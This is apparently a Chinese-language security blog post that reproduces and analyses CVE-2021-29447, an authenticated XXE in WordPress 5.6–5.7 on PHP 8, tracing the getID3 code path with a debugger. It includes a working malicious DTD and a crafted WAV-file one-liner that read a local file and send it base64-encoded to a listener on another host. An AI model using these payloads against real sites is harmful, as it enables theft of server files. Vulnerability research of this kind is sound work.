+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="Phpstorm-phpstudy"><a href="#Phpstorm-phpstudy" class="headerlink" title="Phpstorm+phpstudy"></a>Phpstorm+phpstudy</h4><h5 id="软件版本"><a href="#软件版本" class="headerlink" title="软件版本"></a>软件版本</h5><ul>
+<li>phpstudy 8.1.1.3（php8.0.2+xdebug3.0.3）</li>
+<li>phpstorm 2024.1.1</li>
+</ul>
+<h5 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h5><p>phpstudy中安装扩展xdebug：</p>
+<p><img src="/2023/04/27/file-upload/240520132525607.png" srcset="/img/loading.gif" lazyload alt="image-20240520132525607"></p>
+<p>php.ini配置如下：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Xdebug]</span><br><span class="hljs-attr">zend_extension</span>=D:/phpstudy_pro/Extensions/php/php8.<span class="hljs-number">0.2</span>nts/ext/php_xdebug.dll<br><span class="hljs-attr">xdebug.collect_params</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.colletc_return</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.auto_trace</span>=<span class="hljs-literal">Off</span><br><span class="hljs-attr">xdebug.remote_enable</span>=<span class="hljs-literal">On</span><br><span class="hljs-attr">xdebug.remote_host</span>=<span class="hljs-number">192.168</span>.<span class="hljs-number">122.1</span><br><span class="hljs-attr">xdebug.remote_port</span>=<span class="hljs-number">9002</span><br><span class="hljs-attr">xdebug.remote_handler</span>=dbgp<br><span class="hljs-attr">xdebug.idkey</span>=<span class="hljs-string">&quot;PHPSTORM&quot;</span><br><span class="hljs-attr">xdebug.mode</span>=debug<br></code></pre></td></tr></table></figure>
+
+<p>注意这里的host，port和idkey需要跟后续phpstorm中的配置保持一致。</p>
+<p>phpstorm配置如下。</p>
+<p>debug port跟php.ini保持一致，可以加上9003，取消勾选force break at first line…</p>
+<p><img src="/2023/04/27/file-upload/240520133313856.png" srcset="/img/loading.gif" lazyload alt="image-20240520133313856"></p>
+<p>DBGp Proxy中配置host，port和idekey：</p>
+<p><img src="/2023/04/27/file-upload/240520133420767.png" srcset="/img/loading.gif" lazyload alt="image-20240520133420767"></p>
+<p>配置一个server：</p>
+<p><img src="/2023/04/27/file-upload/240520133452570.png" srcset="/img/loading.gif" lazyload alt="image-20240520133452570"></p>
+<p>这里的port跟phpstudy中的web端口保持一致即可。</p>
+<p>加上一个run&#x2F;debug configuration:</p>
+<p><img src="/2023/04/27/file-upload/240520133534244.png" srcset="/img/loading.gif" lazyload alt="image-20240520133534244"></p>
+<p>最后在run选项卡下，取消勾选break at first line in PHP scripts：</p>
+<p><img src="/2023/04/27/file-upload/240520133625958.png" srcset="/img/loading.gif" lazyload alt="image-20240520133625958"></p>
+<p>默认为选中状态，会导致在没有任何断点的情况下，直接在每个文件的第一行下断。</p>
+<h5 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h5><p>打开监听：</p>
+<p><img src="/2023/04/27/file-upload/240520133759361.png" srcset="/img/loading.gif" lazyload alt="image-20240520133759361"></p>
+<p>直接点击debug，在某函数处下断：</p>
+<p><img src="/2023/04/27/file-upload/240520133836977.png" srcset="/img/loading.gif" lazyload alt="image-20240520133836977"></p>
+<p>直接运行到断点处，并且控制台中打印出了各参数值。</p>
+<h4 id="wordpress搭建"><a href="#wordpress搭建" class="headerlink" title="wordpress搭建"></a>wordpress搭建</h4><p><a target="_blank" rel="noopener" href="https://codeload.github.com/WordPress/WordPress/zip/refs/tags/5.7">https://codeload.github.com/WordPress/WordPress/zip/refs/tags/5.7</a></p>
+<p>下载解压后，直接访问，根据提示一步步进行即可。</p>
+<p><strong>tips:在wp-config中加上<code>define(&#39;WP_AUTO_UPDATE_CORE&#39;, false);</code>,否则在wordpress安装成功后，会自动升级版本！</strong></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在本地创建一个evil.dtd:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/windows/win.ini&quot;&gt;<br>&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#x27;http://192.168.122.1:9999/?p=%file;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p>在linux中通过如下命令生成一个wav文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -en <span class="hljs-string">&#x27;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;http://192.168.122.1:9999/evil.dtd&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;&gt;%remote;%init;%trick;]&gt;\x00&#x27;</span> &gt; payload.wav<br></code></pre></td></tr></table></figure>
+
+<p>在evil.dtd同级目录用php开启一个server：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php -S <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure>
+
+<p>在媒体板块上传payload.wav:</p>
+<p><img src="/2023/04/27/file-upload/240521112259063.png" srcset="/img/loading.gif" lazyload alt="image-20240521112259063"></p>
+<p>查看http记录：</p>
+<p><img src="/2023/04/27/file-upload/240521112343994.png" srcset="/img/loading.gif" lazyload alt="image-20240521112343994"></p>
+<p>base64解码：</p>
+<p><img src="/2023/04/27/file-upload/240521112420150.png" srcset="/img/loading.gif" lazyload alt="image-20240521112420150"></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>从公告可以看到：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rv47-pc52-qrhh">WordPress: Authenticated XXE attack when installation is running PHP 8 · Advisory · WordPress&#x2F;wordpress-develop (github.com)</a></p>
+<p><img src="/2023/04/27/file-upload/240520135847575.png" srcset="/img/loading.gif" lazyload alt="image-20240520135847575"></p>
+<p>5.6-5.7版本存在漏洞，而在5.7.1进行了修复，查看一下5.7跟5.7.1版本的代码有哪些改动：</p>
+<p><img src="/2023/04/27/file-upload/240520135949018.png" srcset="/img/loading.gif" lazyload alt="image-20240520135949018"></p>
+<p>重点看一下ID3下getid3.lib.php的内容，如果php版本小于8，就调用<code>libxml_disable_entity_loader(true)</code>，禁止加载外部实体，来防护XXE漏洞。如果php版本大于等于8，就进入到<code>$XMLobject = simplexml_load_string($XMLstring, &#39;SimpleXMLElement&#39;, LIBXML_NOENT);</code>。</p>
+<p><img src="/2023/04/27/file-upload/240520141420348.png" srcset="/img/loading.gif" lazyload alt="image-20240520141420348"></p>
+<p>在源码注释中写到，这个函数在 PHP 8.0 中已被弃用，因为在 libxml 2.9.0 中，默认已禁用外部实体加载，因此不再需要使用这个函数来防范 XXE 攻击。但是在simplexml_load_string()中，加上了LIBXML_NOENT选项，从而开启了实体替换。在这种情况下，外部实体将被获取并替换，最终导致XXE漏洞。</p>
+<p>全局搜索：</p>
+<p><img src="/2023/04/27/file-upload/240520145009840.png" srcset="/img/loading.gif" lazyload alt="image-20240520145009840"></p>
+<p>XML2array只有一处调用，跟进查看：</p>
+<p><img src="/2023/04/27/file-upload/240520145226805.png" srcset="/img/loading.gif" lazyload alt="image-20240520145226805"></p>
+<p>XMLarray定义如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">XML2array</span>(<span class="hljs-params"><span class="hljs-variable">$XMLstring</span></span>)</span><br></code></pre></td></tr></table></figure>
+
+<p>因此，在426行处，传入的参数<code>$thisfile_riff_WAVE[&#39;iXML&#39;][0][&#39;data&#39;])</code>，最终传入了simplexml_load_string()，作为$XMLstring进行解析。</p>
+<p>下面跟一下<code>$thisfile_riff_WAVE</code></p>
+<p>直接翻到最前面：</p>
+<p><img src="/2023/04/27/file-upload/240520145735082.png" srcset="/img/loading.gif" lazyload alt="image-20240520145735082"></p>
+<p>往后找：</p>
+<p><img src="/2023/04/27/file-upload/240520145812864.png" srcset="/img/loading.gif" lazyload alt="image-20240520145812864"></p>
+<p>应该是在169行这里。</p>
+<p>而<code>$thisfile_riff_WAVE</code>被赋值为<code>$thisfile_riff[&#39;WAVE&#39;]</code>的引用，继续跟到第五十行：</p>
+<p><img src="/2023/04/27/file-upload/240520150157047.png" srcset="/img/loading.gif" lazyload alt="image-20240520150157047"></p>
+<p>看到$info，跟进getid3:</p>
+<p><img src="/2023/04/27/file-upload/240520154739952.png" srcset="/img/loading.gif" lazyload alt="image-20240520154739952"></p>
+<p>是getid3_riff的父类的构造方法。</p>
+<p>下面要找到getid3_riff类在哪里进行了实例化。</p>
+<p><img src="/2023/04/27/file-upload/240520155144849.png" srcset="/img/loading.gif" lazyload alt="image-20240520155144849"></p>
+<p>这里一共找到两处：</p>
+<p><img src="/2023/04/27/file-upload/240521160151295.png" srcset="/img/loading.gif" lazyload alt="image-20240521160151295"></p>
+<p><img src="/2023/04/27/file-upload/240521160213958.png" srcset="/img/loading.gif" lazyload alt="image-20240521160213958"></p>
+<p>分别在Analyze和ParseRIFFdata中。</p>
+<p>搜索ParseRIFFdata，只有一处调用，在Analyze中：</p>
+<p><img src="/2023/04/27/file-upload/240521160301780.png" srcset="/img/loading.gif" lazyload alt="image-20240521160301780"></p>
+<p>接下来就重点找Analyze，并且是与getid3_riff类的实例化相关。</p>
+<p>搜索Analyze，最终筛选出两处：</p>
+<p><img src="/2023/04/27/file-upload/240522103047394.png" srcset="/img/loading.gif" lazyload alt="image-20240522103047394"></p>
+<p>这里$determined_format[‘module’]与getid3_进行了拼接，可能会拼接成getid3_riff。</p>
+<p><img src="/2023/04/27/file-upload/240522103059153.png" srcset="/img/loading.gif" lazyload alt="image-20240522103059153"></p>
+<p>这里在Analyze上一行直接new了一个getid3_riff，同样进行了实例化，前面已经提到过，这里是在ParseRIFFdata内，而ParseRIFFdata仅仅在Analyse中被调用了一次。</p>
+<p>因此重点看640行处的Analyze。</p>
+<p><img src="/2023/04/27/file-upload/240522104031631.png" srcset="/img/loading.gif" lazyload alt="image-20240522104031631"></p>
+<p>要确定$class_name，就要跟$determined_format，直接看到第一处：</p>
+<p><img src="/2023/04/27/file-upload/240522104125171.png" srcset="/img/loading.gif" lazyload alt="image-20240522104125171"></p>
+<p>继续跟GetFileFormat：</p>
+<p><img src="/2023/04/27/file-upload/240522104253570.png" srcset="/img/loading.gif" lazyload alt="image-20240522104253570"></p>
+<p>这里首先是一个foreach的循环，从数组中取$format_name和$info，并通过后续的if判断，返回$info的值或者false。</p>
+<p>跟进GetFileFormatArray:</p>
+<p><img src="/2023/04/27/file-upload/240522104452348.png" srcset="/img/loading.gif" lazyload alt="image-20240522104452348"></p>
+<p>最终返回值是$format_info，而$format_info里面包含了各种文件类型，直接搜索riff：</p>
+<p><img src="/2023/04/27/file-upload/240522104854187.png" srcset="/img/loading.gif" lazyload alt="image-20240522104854187"></p>
+<p>跟到这里可以看到，如果满足<code>(!empty($info[&#39;pattern&#39;]) &amp;&amp; preg_match(&#39;#&#39;.$info[&#39;pattern&#39;].&#39;#s&#39;, $filedata)</code>，就会把整个info返回，最终与$determined_format[‘module’]进行拼接，也就是riff，$class_name被赋值为getid3_riff，进行实例化。</p>
+<p>确定了Analyze的位置（wp&#x2F;wp-includes&#x2F;ID3&#x2F;getid3.php:640  analyze()），继续搜索analyze：</p>
+<p><img src="/2023/04/27/file-upload/240522105449853.png" srcset="/img/loading.gif" lazyload alt="image-20240522105449853"></p>
+<p>一共有两处调用，分别是media.php的3550行和3661行。</p>
+<p> wp_read_video_metadata:</p>
+<p><img src="/2023/04/27/file-upload/240522111529128.png" srcset="/img/loading.gif" lazyload alt="image-20240522111529128"></p>
+<p>wp_read_audio_metadata:</p>
+<p><img src="/2023/04/27/file-upload/240522111600018.png" srcset="/img/loading.gif" lazyload alt="image-20240522111600018"></p>
+<p>从名称来看应该是读取视频数据。</p>
+<p>先看wp_read_video_metadata:</p>
+<p><img src="/2023/04/27/file-upload/240522111739564.png" srcset="/img/loading.gif" lazyload alt="image-20240522111739564"></p>
+<p>搜索到的结果都是在wp_generate_attachment_metadata函数中：</p>
+<p><img src="/2023/04/27/file-upload/240522112752888.png" srcset="/img/loading.gif" lazyload alt="image-20240522112752888"></p>
+<p>从注释和代码可以大致判断出，该函数是用来处理image类型的文件，而前面的分析提到，如果要拼接成riff，需要audio&#x2F;wav类型的文件，而不是image，暂时跳过。</p>
+<p>下面找wp_read_audio_metadata。</p>
+<p>共有两处调用：</p>
+<p><img src="/2023/04/27/file-upload/240522113014053.png" srcset="/img/loading.gif" lazyload alt="image-20240522113014053"></p>
+<p>分别在image.php和media.php，image.php的部分前面已经分析过，直接看media.php:321.</p>
+<p><img src="/2023/04/27/file-upload/240522113214888.png" srcset="/img/loading.gif" lazyload alt="image-20240522113214888"></p>
+<p>在media_handle_upload函数内，搜索得到5处结果。</p>
+<p>分别查看后最终定位到wp_ajax_upload_attachment函数中：</p>
+<p><img src="/2023/04/27/file-upload/240522113553383.png" srcset="/img/loading.gif" lazyload alt="image-20240522113553383"></p>
+<p>继续跟：</p>
+<p><img src="/2023/04/27/file-upload/240522114603126.png" srcset="/img/loading.gif" lazyload alt="image-20240522114603126"></p>
+<p>当action&#x3D;upload-attachment时，包含wp-admin&#x2F;includes&#x2F;ajax-actions.php，并调用wp_media_attachment方法，到这里已经很明显是一个上传请求，并且大致的调用链也已经清晰了，在每个调用的地方都打下断点：</p>
+<p><img src="/2023/04/27/file-upload/240522132603456.png" srcset="/img/loading.gif" lazyload alt="image-20240522132603456"></p>
+<p>下面开始尝试debug并构造出最终payload。</p>
+<p>最终的目的是要成功执行到<code>$XMLobject = simplexml_load_string($XMLstring, &#39;SimpleXMLElement&#39;, LIBXML_NOENT);</code>，首先找到上传点，随便上传一个txt文件：</p>
+<p><img src="/2023/04/27/file-upload/240522133710622.png" srcset="/img/loading.gif" lazyload alt="image-20240522133710622"></p>
+<p>action&#x3D;upload-attachment，跟前面分析的一致，并且成功断在wp_ajax_upload_attachment:</p>
+<p><img src="/2023/04/27/file-upload/240522133825207.png" srcset="/img/loading.gif" lazyload alt="image-20240522133825207"></p>
+<p>执行到下个断点：</p>
+<p><img src="/2023/04/27/file-upload/240522133858679.png" srcset="/img/loading.gif" lazyload alt="image-20240522133858679"></p>
+<p>到这里如果继续执行，就会直接跑完整个上传的过程，后面的断点处不会断住。</p>
+<p>步入查看：</p>
+<p><img src="/2023/04/27/file-upload/240522134535620.png" srcset="/img/loading.gif" lazyload alt="image-20240522134535620"></p>
+<p>如果要按照前面分析的调用链执行下去，就要使if判断的condition为真，否则就会直接跳过。</p>
+<p>而condition中是一个$type的正则匹配，$type&#x3D;$file[‘type’]，就要弄清楚$file的值是如何得来的，在303行处打断点，步入：</p>
+<p><img src="/2023/04/27/file-upload/240522134904962.png" srcset="/img/loading.gif" lazyload alt="image-20240522134904962"></p>
+<p>继续下断点，步入：</p>
+<p><img src="/2023/04/27/file-upload/240522135140870.png" srcset="/img/loading.gif" lazyload alt="image-20240522135140870"></p>
+<p>在_wp_handle_upload函数中，通过wp_check_filetype_and_ext来给$ext,$type等赋值，步入880行：</p>
+<p><img src="/2023/04/27/file-upload/240522135433021.png" srcset="/img/loading.gif" lazyload alt="image-20240522135433021"></p>
+<p>wp_check_filetype，继续步入：</p>
+<p><img src="/2023/04/27/file-upload/240522135535787.png" srcset="/img/loading.gif" lazyload alt="image-20240522135535787"></p>
+<p>这里的逻辑很清晰，就是给出一个mime白名单，对于白名单里的内容，通过foreach进行后缀名匹配。</p>
+<p><img src="/2023/04/27/file-upload/240522135738827.png" srcset="/img/loading.gif" lazyload alt="image-20240522135738827"></p>
+<p>匹配上了txt，$type&#x3D;text&#x2F;plain,$ext&#x3D;txt.</p>
+<p>跳回到wp_check_filetype_and_ext()：</p>
+<p><img src="/2023/04/27/file-upload/240522144223931.png" srcset="/img/loading.gif" lazyload alt="image-20240522144223931"></p>
+<p>调用finfo_file，finfo_file通过magic number进行MIME格式判断。并且后续会同时比较$real_mime和$type，如果服务器能匹配上，并且在白名单中，就给一个type的值，否则为false。</p>
+<p><img src="/2023/04/27/file-upload/240522150247571.png" srcset="/img/loading.gif" lazyload alt="image-20240522150247571"></p>
+<p>回到前面的匹配条件，需要满足<code>preg_match( &#39;#^audio#&#39;, $type )</code>，到wp_check_filetype()中查看白名单内容，搜索audio：</p>
+<p><img src="/2023/04/27/file-upload/240522150646485.png" srcset="/img/loading.gif" lazyload alt="image-20240522150646485"></p>
+<p>共找到10种后缀类型。</p>
+<p>将txt后缀改为mp3，尝试过type检测：</p>
+<p><img src="/2023/04/27/file-upload/240522152708094.png" srcset="/img/loading.gif" lazyload alt="image-20240522152708094"></p>
+<p>通过后缀匹配到type为audio&#x2F;mpeg，但是通过finfo_file检测到MIME为text&#x2F;plain，不一致，最终赋值为false，后续代码不能继续执行。</p>
+<p>直接复制某mp3文件的文件头，复制16位，重新上传：</p>
+<p><img src="/2023/04/27/file-upload/240522155324014.png" srcset="/img/loading.gif" lazyload alt="image-20240522155324014"></p>
+<p><img src="/2023/04/27/file-upload/240522155253241.png" srcset="/img/loading.gif" lazyload alt="image-20240522155253241"></p>
+<p><img src="/2023/04/27/file-upload/240522155349526.png" srcset="/img/loading.gif" lazyload alt="image-20240522155349526"></p>
+<p>type为autio&#x2F;mpeg，成功执行wp_read_audio_metadata(),步入：</p>
+<p><img src="/2023/04/27/file-upload/240522155439570.png" srcset="/img/loading.gif" lazyload alt="image-20240522155439570"></p>
+<p>成功执行到下一个断点，继续步入，跟到analyze():</p>
+<p><img src="/2023/04/27/file-upload/240522155528985.png" srcset="/img/loading.gif" lazyload alt="image-20240522155528985"></p>
+<p>至此，已经到了getID3类中，如果要继续执行，就要满足$determined_format[‘module’]为riff。</p>
+<p>先继续往下执行代码查看：</p>
+<p><img src="/2023/04/27/file-upload/240522160356553.png" srcset="/img/loading.gif" lazyload alt="image-20240522160356553"></p>
+<p>到实例化这一步，$class_name为getid3_mp3，在GetFileFormat()这一步，给$determined_format赋值为mp3，而不是riff。</p>
+<p>接下来针对这一点继续分析。</p>
+<p><img src="/2023/04/27/file-upload/240522162251378.png" srcset="/img/loading.gif" lazyload alt="image-20240522162251378"></p>
+<p>要满足<code>GetFileFormat($formattest, ($original_filename ? $original_filename : $filename));</code>为riff，就要保证</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">GetFileFormatArray</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$format_name</span> =&gt; <span class="hljs-variable">$info</span>) &#123;<br>	<span class="hljs-comment">// The /s switch on preg_match() forces preg_match() NOT to treat</span><br>	<span class="hljs-comment">// newline (0x0A) characters as special chars but do a binary match</span><br>	<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;pattern&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;#&#x27;</span>.<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;pattern&#x27;</span>].<span class="hljs-string">&#x27;#s&#x27;</span>, <span class="hljs-variable">$filedata</span>)) &#123;<br>		<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;include&#x27;</span>] = <span class="hljs-string">&#x27;module.&#x27;</span>.<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;group&#x27;</span>].<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;module&#x27;</span>].<span class="hljs-string">&#x27;.php&#x27;</span>;<br>		<span class="hljs-keyword">return</span> <span class="hljs-variable">$info</span>;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>而riff数组如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&#x27;riff&#x27;</span> =&gt; <span class="hljs-keyword">array</span>(<br>							<span class="hljs-string">&#x27;pattern&#x27;</span>   =&gt; <span class="hljs-string">&#x27;^(RIFF|SDSS|FORM)&#x27;</span>,<br>							<span class="hljs-string">&#x27;group&#x27;</span>     =&gt; <span class="hljs-string">&#x27;audio-video&#x27;</span>,<br>							<span class="hljs-string">&#x27;module&#x27;</span>    =&gt; <span class="hljs-string">&#x27;riff&#x27;</span>,<br>							<span class="hljs-string">&#x27;mime_type&#x27;</span> =&gt; <span class="hljs-string">&#x27;audio/wav&#x27;</span>,<br>							<span class="hljs-string">&#x27;fail_ape&#x27;</span>  =&gt; <span class="hljs-string">&#x27;WARNING&#x27;</span>,<br>						),<br></code></pre></td></tr></table></figure>
+
+<p>就是要保证$filedata为RIFF，$filedata来源为：</p>
+<p><img src="/2023/04/27/file-upload/240522162528391.png" srcset="/img/loading.gif" lazyload alt="image-20240522162528391"></p>
+<p>这里有fseek和fread，问了一下gpt：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">fseek</span><span class="hljs-params">(<span class="hljs-variable">$this</span>-&gt;fp, <span class="hljs-variable">$this</span>-&gt;info[<span class="hljs-string">&#x27;avdataoffset&#x27;</span>])</span></span>: 这一行代码是在文件指针（<span class="hljs-variable">$this</span>-&gt;fp）上进行偏移操作。fseek 函数用于在文件中定位指针的位置。第一个参数是文件指针，第二个参数是要移动的偏移量。在这里，<span class="hljs-variable">$this</span>-&gt;info<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;avdataoffset&#x27;</span>]</span> 是一个数组中的键，用于指定文件中的偏移量。这表示代码将从文件的指定位置开始读取数据。<br><br><span class="hljs-function"><span class="hljs-title">fread</span><span class="hljs-params">(<span class="hljs-variable">$this</span>-&gt;fp, <span class="hljs-number">32774</span>)</span></span>: 这一行代码是使用 fread 函数从文件中读取数据。第一个参数是文件指针，第二个参数是要读取的最大字节数。在这里，它试图读取 <span class="hljs-number">32774</span> 字节的数据。<br><br>至于 avdataoffset 是什么意思，通常它是指音视频文件中音视频数据（AV data）的偏移量。这个偏移量指示了文件中的数据从哪里开始。但是，它不是一个固定值，它的值会根据文件的类型和格式而变化。在读取特定类型的音视频文件时，需要根据文件格式解析文件头部信息，从中提取出这个偏移量的值，然后才能正确地定位到音视频数据的起始位置。<br></code></pre></td></tr></table></figure>
+
+<p>也就是说，首先将指针移动到info[‘avdataoffset’]处，并且从该处开始，匹配pattern，下面修改mp3文件，使得在经过偏移之后，被解析成riff。重跑一遍看偏移量：</p>
+<p><img src="/2023/04/27/file-upload/240522215644958.png" srcset="/img/loading.gif" lazyload alt="image-20240522215644958"></p>
+<p>121450.在winhex中填充0字符，在121450(1DA6A)偏移之后，填充RIFF：</p>
+<p><img src="/2023/04/27/file-upload/240522222102683.png" srcset="/img/loading.gif" lazyload alt="image-20240522222102683"></p>
+<p><img src="/2023/04/27/file-upload/240522222028575.png" srcset="/img/loading.gif" lazyload alt="image-20240522222028575"></p>
+<p>成功，接下来由640行步入到Analyze。</p>
+<p>回到开头的分析，这里需要关注<code>$thisfile_riff_WAVE = &amp;$thisfile_riff[&#39;WAVE&#39;];</code>，再到<code>$parsedXML = getid3_lib::XML2array($thisfile_riff_WAVE[&#39;iXML&#39;][0][&#39;data&#39;])</code>。</p>
+<p>因此，需要找到$thisfile_riff[‘WAVE’]在何处被赋值，往前看最终定位到：</p>
+<p><img src="/2023/04/27/file-upload/240522222624807.png" srcset="/img/loading.gif" lazyload alt="image-20240522222624807"></p>
+<p>需要满足两个条件：</p>
+<ul>
+<li>$RIFFsubtype&#x3D;’WAVE’</li>
+<li>$this-&gt;ParseRIFF($offset, ($offset + $thisfile_riff[‘header_size’] - 4))能被解析成<code>$thisfile_riff_WAVE[&#39;iXML&#39;][0][&#39;data&#39;]</code></li>
+</ul>
+<p>代码如下：</p>
+<p><img src="/2023/04/27/file-upload/240522223249288.png" srcset="/img/loading.gif" lazyload alt="image-20240522223249288"></p>
+<p>取12个字节，前四个字节为type(RIFF)，接下来为size，最后四个为subtype(需要为WAVE)。</p>
+<p>继续改mp3文件：</p>
+<p><img src="/2023/04/27/file-upload/240522223719683.png" srcset="/img/loading.gif" lazyload alt="image-20240522223719683"></p>
+<p><img src="/2023/04/27/file-upload/240522223651981.png" srcset="/img/loading.gif" lazyload alt="image-20240522223651981"></p>
+<p>subtype解决，但是右边的值为false。</p>
+<p>最后一步就是跟进ParseRIFF，修改mp3文件使得能被成功解析为<code>$thisfile_riff_WAVE[&#39;iXML&#39;][0][&#39;data&#39;]</code>即可。</p>
+<p>跟进ParseRIFF:</p>
+<p><img src="/2023/04/27/file-upload/240522233619114.png" srcset="/img/loading.gif" lazyload alt="image-20240522233619114"></p>
+<p>$chunkname为12个字节偏移后的四个字节，需要解析为iXML，并且在代码中也能看到该分支：</p>
+<p><img src="/2023/04/27/file-upload/240522233822454.png" srcset="/img/loading.gif" lazyload alt="image-20240522233822454"></p>
+<p>修改mp3文件：</p>
+<p><img src="/2023/04/27/file-upload/240522234511026.png" srcset="/img/loading.gif" lazyload alt="image-20240522234511026"></p>
+<p>chunkname为iXML，iXML后4个字节表示chunksize，随便输入1111（十进制）：</p>
+<p><img src="/2023/04/27/file-upload/240522234359175.png" srcset="/img/loading.gif" lazyload alt="image-20240522234359175"></p>
+<p>在下面的if判断中报警，chunksize过大：</p>
+<p><img src="/2023/04/27/file-upload/240522234419697.png" srcset="/img/loading.gif" lazyload alt="image-20240522234419697"></p>
+<p>修改mp3:</p>
+<p><img src="/2023/04/27/file-upload/240522234936011.png" srcset="/img/loading.gif" lazyload alt="image-20240522234936011"></p>
+<p>此时能够进入if语句：</p>
+<p><img src="/2023/04/27/file-upload/240522234920063.png" srcset="/img/loading.gif" lazyload alt="image-20240522234920063"></p>
+<p>读取chunksize个长度的数据，赋值给<code>$RIFFchunk[$chunkname][$thisindex][&#39;data&#39;]</code>，也就是<code>$RIFFchunk[&#39;iXML&#39;][0][&#39;data&#39;]</code>,也即<code>$thisfile_riff_WAVE[&#39;iXML&#39;][0][&#39;data&#39;]</code>.</p>
+<p>下面直接插入xxe的payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span>[<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;http://192.168.122.1:9999/evil.dtd&#x27;</span>&gt;</span>%remote;%init;%trick;]&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>长度为120，注意，chunksize的4个字节十进制需要大于120.改为150：</p>
+<p><img src="/2023/04/27/file-upload/240522235852874.png" srcset="/img/loading.gif" lazyload alt="image-20240522235852874"></p>
+<p>再次上传，成功将xml数据带入到simplexml_load_string()，evil.dtd目录开启监听，上传mp3文件：</p>
+<p><img src="/2023/04/27/file-upload/240522235836708.png" srcset="/img/loading.gif" lazyload alt="image-20240522235836708"></p>
+<p>成功带出数据。</p>
+<p><strong>tips:在此，仅利用mp3文件，逐步分析poc的构成，如果直接用.wav文件会更简单(avdataoffset&#x3D;0).</strong></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/vulnerability/">vulnerability</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/vulnerability/">vulnerability</a>
+                    
+                      <a class="hover-with-bg" href="/tags/CVE-2021-29447/">CVE-2021-29447</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
